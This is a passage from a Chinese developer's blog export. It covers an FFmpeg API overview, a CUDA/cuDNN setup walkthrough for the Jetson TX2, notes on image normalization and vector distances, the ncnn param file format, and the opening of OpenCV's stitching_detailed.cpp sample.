	out.open("quick_sort.txt");
	assert(out.is_open());
	
	for (idx = 0 ; idx &lt; DATA_LEN; idx++ )&#123;
			
		out&lt;&lt;*(buffer+idx);
		out&lt;&lt;"\n";
	&#125;
	out.close();
	
  	delete []buffer;  
	return 0;
&#125;




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>数据结构与算法</tag>
        <tag>排序算法</tag>
      </tags>
  </entry>
  <entry>
    <title>FFmpeg 基本操作摘要(一) （转流、解码、编码）</title>
    <url>/2018/05/11/blog_idx_061/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  近一段时间来，自己的主要工作都在是在做数据源端（设备端）音视频传输、编解码相关的事情，于是逐渐又和FFmpeg打上了交到，用到了其中的一些常见的内容，同时也解决了一些不常见的事情。
同时这里表达对“”“”雷神“”“”的敬意（一路走好，雷神），其blog上相关的FFmpeg教程是我学习FFmpeg的启蒙教程，其的blog可以不夸张的说，是国内非常非常非常好非常非常非常好非常非常非常好的音视频相关入门教程了，建议搞音视频的人可以多参考。这里提供一个链接指向雷神的博客地址，供大家参考（需从零学习FFmpeg，请参考其FFmpeg专栏）：https://blog.csdn.net/leixiaohua1020 




FFmpeg 相关内容简介



FFmpeg常用结构体
AVFormatContext   
&#x2F;&#x2F;Format I&#x2F;O context.（FFmpeg中的IO流的格式容器，具体来说就是用来记录打开的流的格式相关信息，列如：记录打开的rtsp流中的音视频流格式信息、MP4
文件的流格式信息等等）
AVCodecContext    &#x2F;&#x2F;FFmpeg中记录编码器相关信息的容器

AVCodec  &#x2F;&#x2F;FFmpeg 中编码器容器

AVFrame &#x2F;&#x2F;This structure describes decoded (raw) audio or video data.（FFmpeg中用于描述裸音视频数据的容器，列如：视频中的YUV数据，音频中的PCM数据）

AVPacket  &#x2F;&#x2F; This structure stores compressed data. It is typically exported by demuxers
 &#x2F;&#x2F;and then passed as input to decoders, or received as output from encoders and
 &#x2F;&#x2F;then passed to muxers.(此结构体用于描述音视频编码后的数据，主要用在把编码后的数据送入解码器或者接收编码器输出的数据，列如：视频中的H264数据, 音频中的：G711A数据)

SwsContext &#x2F;&#x2F;图像缩放和变换的关键容器



FFmpeg中常见调用
void av_register_all(void); &#x2F;&#x2F; Initialize libavformat and register all the muxers, demuxers and
 &#x2F;&#x2F; protocols. If you do not call this function, then you can select
 &#x2F;&#x2F; exactly which formats you want to support.
 &#x2F;&#x2F;FFmpeg 中用于初始化libavformat 库，注册音视频复用器，各种协议等等。 这里需要注意的是，许多没有用到了内容都注册了，可能造成浪费，若需要指定注册哪些内容，可参考av_register_output_format（）、av_register_input_format（）


int avformat_network_init(void); &#x2F;&#x2F;此函数用于初始化网络相关的组件，列如：你要解析RTSP流，需要先调用此函数
&#x2F;**
 * Do global initialization of network components. This is optional,
 * but recommended, since it avoids the overhead of implicitly
 * doing the setup for each session.
 *
 * Calling this function will become mandatory if using network
 * protocols at some major version bump.
 *&#x2F;

AVFormatContext *avformat_alloc_context(void); &#x2F;&#x2F;为AVFormatContext分配空间
void avformat_free_context(AVFormatContext *s); &#x2F;&#x2F;释放AVFormatContext空间

int avformat_open_input(AVFormatContext **ps, const char *filename, AVInputFormat *fmt, AVDictionary **options);&#x2F;&#x2F;Open an input stream and read the header.


int avio_open(AVIOContext **s, const char *url, int flags); &#x2F;&#x2F; 用于初始化AVIOContext，此结构体用于文件的读写操作
 &#x2F;&#x2F;* Create and initialize a AVIOContext for accessing the
 &#x2F;&#x2F;* resource indicated by url.

int avio_close(AVIOContext *s); &#x2F;&#x2F;释放一个AVIOContext对象

int avformat_find_stream_info(AVFormatContext *ic, AVDictionary **options); &#x2F;&#x2F;读取流数据，分析流信息
&#x2F;&#x2F;Read packets of a media file to get stream information. 

void av_dump_format(AVFormatContext *ic,
                    int index,
                    const char *url,
                    int is_output);&#x2F;&#x2F;就是打印一下AVFormatContext 里面存放的一些我们关心的信息
 &#x2F;*
  * Print detailed information about the input or output format, such as
 * duration, bitrate, streams, container, programs, metadata, side data,
 * codec and time base.
*&#x2F;


AVCodec *avcodec_find_decoder(enum AVCodecID id);查找一个解码器
&#x2F;&#x2F;Find a registered decoder with a matching codec ID.

int avcodec_open2(AVCodecContext *avctx, const AVCodec *codec, AVDictionary **options);&#x2F;&#x2F;初始化一个编码器，初始化此结构体AVCodecContext 

&#x2F;*
 * Initialize the AVCodecContext to use the given AVCodec. Prior to using this
 * function the context has to be allocated with avcodec_alloc_context3().
*&#x2F;

int avcodec_close(AVCodecContext *avctx);&#x2F;&#x2F;释放AVCodecContext 空间

int av_read_frame(AVFormatContext *s, AVPacket *pkt);&#x2F;&#x2F;返回下一帧，数据（编码后的数据）存放到pkt里面，这里会给AVPacket 分配空间，此处一定要释放，否则将会发生内存泄漏
&#x2F;&#x2F;Return the next frame of a stream.

int av_new_packet(AVPacket *pkt, int size);&#x2F;&#x2F;给AVPacket buf成员分配空间，同理上文
&#x2F;*
 * Allocate the payload of a packet and initialize its fields with
 * default values.
*&#x2F;
void av_free_packet(AVPacket *pkt);&#x2F;&#x2F;释放AVPacket 

AVFrame *av_frame_alloc(void);&#x2F;&#x2F;申请AVFrame空间 
void av_frame_free(AVFrame **frame);&#x2F;&#x2F;释放AVFrame空间 

void *av_malloc(size_t size);&#x2F;&#x2F;ffmpeg中申请一定大小的内存空间
void av_free(void *ptr);&#x2F;&#x2F;释放空间
&#x2F;&#x2F;av_malloc  av_free是对malloc和free的封装，本质就是基础内存操作

struct SwsContext *sws_getContext(int srcW, int srcH, enum AVPixelFormat srcFormat,
                                  int dstW, int dstH, enum AVPixelFormat dstFormat,
                                  int flags, SwsFilter *srcFilter,
                                  SwsFilter *dstFilter, const double *param);&#x2F;&#x2F;创建一个指定大小和颜色空间的SwsContext 
&#x2F;*
 * Allocate and return an SwsContext. You need it to perform
 * scaling&#x2F;conversion operations using sws_scale().
*&#x2F;

int sws_scale(struct SwsContext *c, const uint8_t *const srcSlice[],
              const int srcStride[], int srcSliceY, int srcSliceH,
              uint8_t *const dst[], const int dstStride[]);&#x2F;&#x2F;根据指定SwsContext ，来对原始图像进行变换
&#x2F;*
 * Scale the image slice in srcSlice and put the resulting scaled
 * slice in the image in dst. A slice is a sequence of consecutive
 * rows in an image.
*&#x2F;

int avcodec_decode_video2(AVCodecContext *avctx, AVFrame *picture,
                         int *got_picture_ptr,
                         const AVPacket *avpkt);&#x2F;&#x2F;对一帧数据进行解码
&#x2F; * Decode the video frame of size avpkt-&gt;size from avpkt-&gt;data into picture.
 * Some decoders may support multiple frames in a single AVPacket, such
 * decoders would then just decode the first frame.
 * &#x2F;
int avcodec_encode_video2(AVCodecContext *avctx, AVPacket *avpkt,
                          const AVFrame *frame, int *got_packet_ptr);&#x2F;&#x2F;对一帧数据进行编码
                          



FFmpeg中需要注意的事项
  FFmpeg中除了正常使用外，需要我们注意的就是内存泄漏的问题了。
  这里我们需要关注几个问题：
&#x2F;*
对于以下的结构体，一定要重点关注，申请了内存，一定要释放，否则在循环调用一些内容时，一定会发生内存泄漏。
AVFormatContext   
AVCodecContext    
AVCodec  
AVFrame 
AVPacket  

其中我们需要核心关注AVPacket这个结构体，这个结构体很容易让我们懵逼，出现内存泄漏。
av_read_frame
av_new_packet
上面两个都会申请内存，需要我们释放内存
av_free_packet
av_packet_unref
由于AVPacket 设计为缓冲区计数的方式，实现了一定的数据共享，方便FFmpeg管理内存，但是这里也给我们埋下了地雷：那就是AVPacket的生命周期就不好确定了，因为你调用了以上的函数，而内存不一定释放了。关于AVPacket还有许多函数，比如av_copy_packet、av_packet_ref、av_init_packet等，使用它们一定要小心，如果需要深入研究，建议查看它们的源码，这样就能够对这些调用有了更深刻的理解。
*&#x2F;
  这里我再多说一句：由于FFmpeg2 和FFmpeg3有巨大的区别，很多东西也发生了变化，网上的教程很多是FFmpeg3以后的，使用的时候需要注意。同时，FFmpeg真的一不留神就发生内存泄漏了，需要我们注意。




FFmpeg 使用的一般流程



解码过程
av_register_all  
avformat_network_init
avformat_alloc_context&#x2F;&#x2F;初始化AVFormatContext
avformat_open_input &#x2F;&#x2F;打开流
avformat_find_stream_info &#x2F;&#x2F;读取流信息
avcodec_find_decoder &#x2F;&#x2F;根据上调用来确定编码器id，然后来查找相关编码器
avcodec_open2 &#x2F;&#x2F;打开编码器，初始化AVCodecContext    
av_read_frame &#x2F;&#x2F;读取一帧压缩数据
avcodec_decode_video2 &#x2F;&#x2F;解压一帧数据
sws_scale &#x2F;&#x2F;数据转换
&#x2F;&#x2F;后续对原始音视频数据进行相关处理


编码过程
av_register_all  
avformat_network_init
avformat_alloc_context
avio_open
avformat_new_stream
&#x2F;&#x2F;这里通过相关方法把原始音视频数据准备好
avcodec_find_decoder &#x2F;&#x2F;根据上调用来确定编码器id，然后来查找相关编码器
avcodec_open2 &#x2F;&#x2F;打开编码器，初始化AVCodecContext   
avcodec_encode_video2 &#x2F;&#x2F;编码
&#x2F;&#x2F;后续处理编码后的事情 


转流过程
av_register_all  
avformat_network_init
avformat_alloc_context&#x2F;&#x2F;初始化AVFormatContext
avformat_open_input &#x2F;&#x2F;打开流
avformat_find_stream_info &#x2F;&#x2F;读取流信息
avcodec_find_decoder &#x2F;&#x2F;根据上调用来确定编码器id，然后来查找相关编码器
avcodec_open2 &#x2F;&#x2F;打开编码器，初始化AVCodecContext    
av_read_frame &#x2F;&#x2F;读取一帧压缩数据
&#x2F;&#x2F;这里对av_read_frame 中的pkt data数据域和size数据域进行处理即可




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>视频处理及流媒体</category>
      </categories>
      <tags>
        <tag>FFmpeg</tag>
      </tags>
  </entry>
  <entry>
    <title>NVIDIA Jestson TX2 配置cuda以及cudnn的坑 ( JetPack-L4T 、Error: downloading update lock、TX2,TX1,TK1相关资源信息)</title>
    <url>/2018/05/15/blog_idx_062/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  主机信息 Linux 4.13.0-41-generic #46~16.04.1-Ubuntu SMP Thu May 3 10:06:43 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
前言

  无




Jestson TX2 配置



JetPack-L4T 资源信息（TX2,TX1,TK1）
  JetPack-L4T-3.0
  资源地址：https://download.csdn.net/download/u011728480/10415628

    
        
    
    
  JetPack-L4T-3.1
  资源地址：https://download.csdn.net/download/u011728480/10415640

    
        
    
    
  JetPack-L4T-3.2，截止发文时，3.2用的依然是3.1的资源信息。


官方配置流程
  就是使用JetPack-L4T工具按照流程进行相关的配置，即可完成全部安装。


民间配置流程
  首先下载上面我提供的资源压缩包，解压，然后打开repository.json文件，这里面包含了此版本关于TX2,TX1,TK1的所有资源地址信息。（此文件稍微分析一下即可得到地址）
  这里我需要的是cuda8.0和cudnn5.1
  关于TX2，JetPack 3.0 的cuda和cudnn地址分别是：(在repository.json文件)
  cuda:


http://developer.download.nvidia.com/devzone/devcenter/mobile/jetpack_l4t/009/linux-x64/cuda-repo-l4t-8-0-local_8.0.64-1_arm64.deb


  cudnn:


http://developer.download.nvidia.com/devzone/devcenter/mobile/jetpack_l4t/009/linux-x64/libcudnn5_5.1.10-1+cuda8.0_arm64.deb


http://developer.download.nvidia.com/devzone/devcenter/mobile/jetpack_l4t/011/linux-x64/libcudnn5-dev_5.1.10-1+cuda8.0_arm64.deb


  下载以上三个包，然后在tx2上，dpkg 安装这三个包,然后：
sudo apt update

sudo apt install cuda-toolkit-8-0 
  最后把/usr/local/cuda/bin/添加到PATH变量
  这样cuda及cudnn就配置完成。其他相关包可参照如此配置。
  友情提示：
    下载以上包时最好使用迅雷或者开代理进行下载，否则可能会出现被墙的可能性。


Error:  downloading update lock
  错误：一直卡downloading update lock  ，最后Error原因：就是大中华防火墙给墙了此信息下载地址（某些电信运营商才会出现，比如我公司移动运营商）
  解决方案：


开启代理后，按照官方教程走。


使用我上文提供的信息下载相关资源，按照民间教程进行配置。






后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
        <category>DL</category>
      </categories>
      <tags>
        <tag>TX2</tag>
        <tag>CUDA</tag>
        <tag>CUDNN</tag>
      </tags>
  </entry>
  <entry>
    <title>图像归一化、特征向量的距离（欧式距离、余弦相似性）的理解</title>
    <url>/2018/06/21/blog_idx_065/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  最近的大部分时间都在学习图像和DL相关知识，并做一定的应用，这里对我学习过程中的一些基础知识进行了整理。




图像归一化

  归一化就是将图像像素值(列如：[0,255])经过一定的计算，使其所有的像素值变换到某一个特定的区间（列如：[0,1]或者[-1,1]）。
  我所理解的归一化的作用有以下：


减小对图像处理的计算量


消除亮度对图片的影响，避免带来了亮度信息的干扰。


消除图像中的极大特征对图像处理的影响，使的图像的特征更均匀，同时也使得图像中的极小特征能够表现出来，不会被抑制。


加快神经网络的收敛，原理就是目标函数输入参数取值范围越小，其等高线近似圆，而不是椭圆，使得梯度下降更快。






特征向量距离

  这里有两种方法把我搞懵逼了。


欧氏距离
  我们常见的二维空间计算两点距离的公式：dst=sqrt((x1-x2)2+(y1-y2)2) 就是欧氏距离在二维空间的定义，多维空间同理。（我理解为：这个距离主要是用来计算两个向量中两个点之间的距离,结果对数值非常敏感，突出的是一种数值大小的感受，如判断图片的分类时，对图片进行打分）


余弦相似性
  余弦定理：cosM=(向量A.向量B)/||A||*||B||，描述向量A、B的方向的差异。（我理解为：这个相似性是描述的两个向量的方向差异，对数值不敏感，突出的是一种相似性的感受，列如人脸特征向量的对比）


其他还有很多方法，但是我没有用到




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>计算机视觉</category>
        <category>DL</category>
      </categories>
      <tags>
        <tag>归一化</tag>
        <tag>特征向量</tag>
      </tags>
  </entry>
  <entry>
    <title>《TencentNCNN系列》 之param文件（网络结构文件）格式分析</title>
    <url>/2018/06/25/blog_idx_066/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  2018.06.25
  ncnn master commit id:b3e24cafc37483dcc97ee61e6f0f6ff1b094300e
前言

  由于公司算法组的算法在某些arm板子的表现不佳，于是需要使用此框架进行优化，初步测试得出的结论为:此框架表现不错，于是需要对此框架进行深入学习。根据相关源码分析，要学习此框架的，最好的开始（突破口）应该在模型参数加载和网络加载部分。今天本文介绍网络文件的格式相关信息（根据其源码分析得出）。




格式分析



param文件举例：

    
        
    
    


上文例图中第一行（版本信息）：
  其数值其实代表的是此param文件的版本。
  相关源码说明：
int magic = 0;
fscanf(fp, "%d", &amp;magic);
if (magic != 7767517)
&#123;
    fprintf(stderr, "param is too old, please regenerate\n");
    return -1;
&#125;


上文例图中第二行（层与数据交换结构数量）：
  第一个数：层（layer）数量
  第二个数：数据交换结构(blob)数量
  相关源码说明：
// parse
int layer_count = 0;
int blob_count = 0;
fscanf(fp, "%d %d", &amp;layer_count, &amp;blob_count);


上文例图第三四行（相关层的信息）：
  前4个值的含义固定：


层的类型


层的名称


输入数据结构（blob）数量（bottom）（input层特殊点）


输出数据结构（blob）数量（top）


  后面有三种类型的值《《《严格按照顺序排序》》》：


第一种：网络输入层名（一个层可能有多个输入，于是有多个网络输入层名）


第二种：网络输出层名（一个层可能有多个输出，于是有多个网络输出层名）


第三种(可能没有)：特殊参数层，一是k=v的类型存在。二是k=len,v1,v2,v3…（数组类型）。此层在ncnn中是存放到paramDict结构中，不同类型层，各种参数意义不一样，需要具体分析。




这里就上文图中第四行的BinaryOp层进行举例分析（其他不同的分析需要具体看不同层的源码）
  层类型：BinaryOp
  层名称：_minusscalar0
  输入数据结构数量（bottom blob）:1
  输出数据结构数量（top blob）:1
  特殊参数1（第一个k=v）:id=0,op_type=1（代表加法Operation_SUB）
  特殊参数2（第二个k=v）:id=1,scale val=1
  特殊参数3（第三个k=v）:id=2,b=127.50000（因为操作类型为减法，所以此值代表减数）
  By the way:上文图中第五行是做乘法。第四五行合在一起代表的是对输入图像进行归一化。
  相关源码：
op_type = pd.get(0, 0);
with_scalar = pd.get(1, 0);
b = pd.get(2, 0.f);




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>DL</category>
      </categories>
      <tags>
        <tag>DL</tag>
        <tag>ncnn</tag>
      </tags>
  </entry>
  <entry>
    <title>关于全景（360）图片拼接的方法（Opencv3.0 Stitcher）----续（一）</title>
    <url>/2018/05/22/blog_idx_063/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  在https://blog.csdn.net/u011728480/article/details/79609493文中，我已经实现了从一个可旋转的相机中采图进行360度的全景拼接。但是最近，又接到了一个任务是关于从三个不同相机（同型号）采集图像进行拼接，这个时候就出现了一个让我崩溃的问题，99.99999999999999999999999999%都拼接不上，这个时候，就需要我们探索与发现一下 Stitcher的工作原理，看能不能找到相关的解决办法或者出现这些问题的原因。




Stitcher 大致工作原理（主要根据网上的资料结合其官方的例子来分析）



首先就是通过算法找特征点


其次就是计算图片之间的特征点的匹配程度


… …（这里的省略号的原因是我也没有太懂后面的流程）


拼接


opencv  example :stitching_detailed.cpp(https://github.com/opencv/opencv/blob/master/samples/cpp/stitching_detailed.cpp)
/*M///////////////////////////////////////////////////////////////////////////////////////
//
//  IMPORTANT: READ BEFORE DOWNLOADING, COPYING, INSTALLING OR USING.
//
//  By downloading, copying, installing or using the software you agree to this license.
//  If you do not agree to this license, do not download, install,
//  copy or use the software.
//
//
//                          License Agreement
//                For Open Source Computer Vision Library
//
// Copyright (C) 2000-2008, Intel Corporation, all rights reserved.
// Copyright (C) 2009, Willow Garage Inc., all rights reserved.
// Third party copyrights are property of their respective owners.
//
// Redistribution and use in source and binary forms, with or without modification,
// are permitted provided that the following conditions are met:
//
//   * Redistribution's of source code must retain the above copyright notice,
//     this list of conditions and the following disclaimer.
//
//   * Redistribution's in binary form must reproduce the above copyright notice,
//     this list of conditions and the following disclaimer in the documentation
//     and/or other materials provided with the distribution.
//
//   * The name of the copyright holders may not be used to endorse or promote products
//     derived from this software without specific prior written permission.
//
// This software is provided by the copyright holders and contributors "as is" and
// any express or implied warranties, including, but not limited to, the implied
// warranties of merchantability and fitness for a particular purpose are disclaimed.
// In no event shall the Intel Corporation or contributors be liable for any direct,
// indirect, incidental, special, exemplary, or consequential damages
// (including, but not limited to, procurement of substitute goods or services;
// loss of use, data, or profits; or business interruption) however caused
// and on any theory of liability, whether in contract, strict liability,
// or tort (including negligence or otherwise) arising in any way out of
// the use of this software, even if advised of the possibility of such damage.
//
//
//M*/

#include &lt;iostream>
#include &lt;fstream>
#include &lt;string>
#include "opencv2/opencv_modules.hpp"
#include &lt;opencv2/core/utility.hpp>
#include "opencv2/imgcodecs.hpp"
#include "opencv2/highgui.hpp"
#include "opencv2/stitching/detail/autocalib.hpp"
#include "opencv2/stitching/detail/blenders.hpp"
#include "opencv2/stitching/detail/timelapsers.hpp"
#include "opencv2/stitching/detail/camera.hpp"
#include "opencv2/stitching/detail/exposure_compensate.hpp"
#include "opencv2/stitching/detail/matchers.hpp"
#include "opencv2/stitching/detail/motion_estimators.hpp"
#include "opencv2/stitching/detail/seam_finders.hpp"
#include "opencv2/stitching/detail/warpers.hpp"
#include "opencv2/stitching/warpers.hpp"

#define ENABLE_LOG 1
#define LOG(msg) std::cout &lt;&lt; msg
#define LOGLN(msg) std::cout &lt;&lt; msg &lt;&lt; std::endl

using namespace std;
using namespace cv;
using namespace cv::detail;

static void printUsage()
&#123;
    cout &lt;&lt;
        "Rotation model images stitcher.\n\n"
        "stitching_detailed img1 img2 [...imgN] [flags]\n\n"
        "Flags:\n"
        "  --preview\n"
        "      Run stitching in the preview mode. Works faster than usual mode,\n"
        "      but output image will have lower resolution.\n"
        "  --try_cuda (yes|no)\n"
        "      Try to use CUDA. The default value is 'no'. All default values\n"
        "      are for CPU mode.\n"
        "\nMotion Estimation Flags:\n"
        "  --work_megapix &lt;float>\n"
        "      Resolution for image registration step. The default is 0.6 Mpx.\n"
        "  --features (surf|orb)\n"
        "      Type of features used for images matching. The default is surf.\n"
        "  --matcher (homography|affine)\n"
        "      Matcher used for pairwise image matching.\n"
        "  --estimator (homography|affine)\n"
        "      Type of estimator used for transformation estimation.\n"
        "  --match_conf &lt;float>\n"
        "      Confidence for feature matching step. The default is 0.65 for surf and 0.3 for orb.\n"
        "  --conf_thresh &lt;float>\n"
        "      Threshold for two images are from the same panorama confidence.\n"
        "      The default is 1.0.\n"
        "  --ba (no|reproj|ray|affine)\n"
        "      Bundle adjustment cost function. The default is ray.\n"
        "  --ba_refine_mask (mask)\n"
        "      Set refinement mask for bundle adjustment. It looks like 'x_xxx',\n"
        "      where 'x' means refine respective parameter and '_' means don't\n"
        "      refine one, and has the following format:\n"
        "      &lt;fx>&lt;skew>&lt;ppx>&lt;aspect>&lt;ppy>. The default mask is 'xxxxx'. If bundle\n"
        "      adjustment doesn't support estimation of selected parameter then\n"
        "      the respective flag is ignored.\n"
        "  --wave_correct (no|horiz|vert)\n"
        "      Perform wave effect correction. The default is 'horiz'.\n"
        "  --save_graph &lt;file_name>\n"
        "      Save matches graph represented in DOT language to &lt;file_name> file.\n"
        "      Labels description: Nm is number of matches, Ni is number of inliers,\n"
        "      C is confidence.\n"
        "\nCompositing Flags:\n"
        "  --warp (affine|plane|cylindrical|spherical|fisheye|stereographic|compressedPlaneA2B1|compressedPlaneA1.5B1|compressedPlanePortraitA2B1|compressedPlanePortraitA1.5B1|paniniA2B1|paniniA1.5B1|paniniPortraitA2B1|paniniPortraitA1.5B1|mercator|transverseMercator)\n"
        "      Warp surface type. The default is 'spherical'.\n"
        "  --seam_megapix &lt;float>\n"
        "      Resolution for seam estimation step. The default is 0.1 Mpx.\n"
        "  --seam (no|voronoi|gc_color|gc_colorgrad)\n"
        "      Seam estimation method. The default is 'gc_color'.\n"
        "  --compose_megapix &lt;float>\n"
        "      Resolution for compositing step. Use -1 for original resolution.\n"
        "      The default is -1.\n"
        "  --expos_comp (no|gain|gain_blocks)\n"
        "      Exposure compensation method. The default is 'gain_blocks'.\n"
        "  --blend (no|feather|multiband)\n"
        "      Blending method. The default is 'multiband'.\n"
        "  --blend_strength &lt;float>\n"
        "      Blending strength from [0,100] range. The default is 5.\n"
        "  --output &lt;result_img>\n"
        "      The default is 'result.jpg'.\n"
        "  --timelapse (as_is|crop) \n"
        "      Output warped images separately as frames of a time lapse movie, with 'fixed_' prepended to input file names.\n"
        "  --rangewidth &lt;int>\n"
        "      uses range_width to limit number of images to match with.\n";
&#125;


// Default command line args
vector&lt;String> img_names;
bool preview = false;
bool try_cuda = false;
double work_megapix = 0.6;
double seam_megapix = 0.1;
double compose_megapix = -1;
float conf_thresh = 1.f;
string features_type = "surf";
string matcher_type = "homography";
string estimator_type = "homography";
string ba_cost_func = "ray";
string ba_refine_mask = "xxxxx";
bool do_wave_correct = true;
WaveCorrectKind wave_correct = detail::WAVE_CORRECT_HORIZ;
bool save_graph = false;
std::string save_graph_to;
string warp_type = "spherical";
int expos_comp_type = ExposureCompensator::GAIN_BLOCKS;
float match_conf = 0.3f;
string seam_find_type = "gc_color";
int blend_type = Blender::MULTI_BAND;
int timelapse_type = Timelapser::AS_IS;
float blend_strength = 5;
string result_name = "result.jpg";
bool timelapse = false;
int range_width = -1;


static int parseCmdArgs(int argc, char** argv)
&#123;
    if (argc == 1)
    &#123;
        printUsage();
        return -1;
    &#125;
    for (int i = 1; i &lt; argc; ++i)
    &#123;
        if (string(argv[i]) == "--help" || string(argv[i]) == "/?")
        &#123;
            printUsage();
            return -1;
        &#125;
        else if (string(argv[i]) == "--preview")
        &#123;
            preview = true;
        &#125;
        else if (string(argv[i]) == "--try_cuda")
        &#123;
            if (string(argv[i + 1]) == "no")
                try_cuda = false;
            else if (string(argv[i + 1]) == "yes")
                try_cuda = true;
            else
            &#123;
                cout &lt;&lt; "Bad --try_cuda flag value\n";
                return -1;
            &#125;
            i++;
        &#125;
        else if (string(argv[i]) == "--work_megapix")
        &#123;
            work_megapix = atof(argv[i + 1]);
            i++;
        &#125;
        else if (string(argv[i]) == "--seam_megapix")
        &#123;
            seam_megapix = atof(argv[i + 1]);
            i++;
        &#125;
        else if (string(argv[i]) == "--compose_megapix")
        &#123;
            compose_megapix = atof(argv[i + 1]);
            i++;
        &#125;
        else if (string(argv[i]) == "--result")
        &#123;
            result_name = argv[i + 1];
            i++;
        &#125;
        else if (string(argv[i]) == "--features")
        &#123;
            features_type = argv[i + 1];
            if (features_type == "orb")
                match_conf = 0.3f;
            i++;
        &#125;
        else if (string(argv[i]) == "--matcher")
        &#123;
            if (string(argv[i + 1]) == "homography" || string(argv[i + 1]) == "affine")
                matcher_type = argv[i + 1];
            else
            &#123;
                cout &lt;&lt; "Bad --matcher flag value\n";
                return -1;
            &#125;
            i++;
        &#125;
        else if (string(argv[i]) == "--estimator")
        &#123;
            if (string(argv[i + 1]) == "homography" || string(argv[i + 1]) == "affine")
                estimator_type = argv[i + 1];
            else
            &#123;
                cout &lt;&lt; "Bad --estimator flag value\n";
                return -1;
            &#125;
            i++;
        &#125;
        else if (string(argv[i]) == "--match_conf")
        &#123;
            match_conf = static_cast&lt;float>(atof(argv[i + 1]));
            i++;
        &#125;
        else if (string(argv[i]) == "--conf_thresh")
        &#123;
            conf_thresh = static_cast&lt;float>(atof(argv[i + 1]));
            i++;
        &#125;
        else if (string(argv[i]) == "--ba")
        &#123;
            ba_cost_func = argv[i + 1];
            i++;
        &#125;
        else if (string(argv[i]) == "--ba_refine_mask")
        &#123;
            ba_refine_mask = argv[i + 1];
            if (ba_refine_mask.size() != 5)
            &#123;
                cout &lt;&lt; "Incorrect refinement mask length.\n";
                return -1;
            &#125;
            i++;
        &#125;
        else if (string(argv[i]) == "--wave_correct")
        &#123;
            if (string(argv[i + 1]) == "no")
                do_wave_correct = false;
            else if (string(argv[i + 1]) == "horiz")
            &#123;
                do_wave_correct = true;
                wave_correct = detail::WAVE_CORRECT_HORIZ;
            &#125;
            else if (string(argv[i + 1]) == "vert")
            &#123;
                do_wave_correct = true;
                wave_correct = detail::WAVE_CORRECT_VERT;
            &#125;
            else
            &#123;
                cout &lt;&lt; "Bad --wave_correct flag value\n";
                return -1;
            &#125;
            i++;
        &#125;
        else if (string(argv[i]) == "--save_graph")
        &#123;
            save_graph = true;
            save_graph_to = argv[i + 1];
            i++;
        &#125;
        else if (string(argv[i]) == "--warp")
        &#123;
            warp_type = string(argv[i + 1]);
            i++;
        &#125;
        else if (string(argv[i]) == "--expos_comp")
        &#123;
            if (string(argv[i + 1]) == "no")
                expos_comp_type = ExposureCompensator::NO;
            else if (string(argv[i + 1]) == "gain")
                expos_comp_type = ExposureCompensator::GAIN;
            else if (string(argv[i + 1]) == "gain_blocks")
                expos_comp_type = ExposureCompensator::GAIN_BLOCKS;
            else
            &#123;
                cout &lt;&lt; "Bad exposure compensation method\n";
                return -1;
            &#125;
            i++;
        &#125;
        else if (string(argv[i]) == "--seam")
        &#123;
            if (string(argv[i + 1]) == "no" ||
                string(argv[i + 1]) == "voronoi" ||
                string(argv[i + 1]) == "gc_color" ||
                string(argv[i + 1]) == "gc_colorgrad" ||
                string(argv[i + 1]) == "dp_color" ||
                string(argv[i + 1]) == "dp_colorgrad")
                seam_find_type = argv[i + 1];
            else
            &#123;
                cout &lt;&lt; "Bad seam finding method\n";
                return -1;
            &#125;
            i++;
        &#125;
        else if (string(argv[i]) == "--blend")
        &#123;
            if (string(argv[i + 1]) == "no")
                blend_type = Blender::NO;
            else if (string(argv[i + 1]) == "feather")
                blend_type = Blender::FEATHER;
            else if (string(argv[i + 1]) == "multiband")
                blend_type = Blender::MULTI_BAND;
            else
            &#123;
                cout &lt;&lt; "Bad blending method\n";
                return -1;
            &#125;
            i++;
        &#125;
        else if (string(argv[i]) == "--timelapse")
        &#123;
            timelapse = true;

            if (string(argv[i + 1]) == "as_is")
                timelapse_type = Timelapser::AS_IS;
            else if (string(argv[i + 1]) == "crop")
                timelapse_type = Timelapser::CROP;
            else
            &#123;
                cout &lt;&lt; "Bad timelapse method\n";
                return -1;
